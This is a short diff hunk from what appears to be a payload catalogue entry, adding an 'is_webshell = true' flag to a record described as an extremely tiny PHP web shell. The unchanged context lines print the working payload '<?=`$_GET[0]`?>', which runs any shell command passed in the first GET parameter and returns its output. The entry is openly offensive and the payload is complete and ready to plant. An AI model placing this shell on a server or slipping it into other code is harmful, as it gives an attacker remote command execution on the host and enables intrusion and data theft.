@@ -5,6 +5,7 @@ type = "web"
 proto = ""
 lang = "php"
 description = "An extremely tiny PHP web shell that executes a command passed via the first GET parameter (0) and outputs the result directly."
+is_webshell = true
 
 payload = "<?=`$_GET[0]`?>"
 
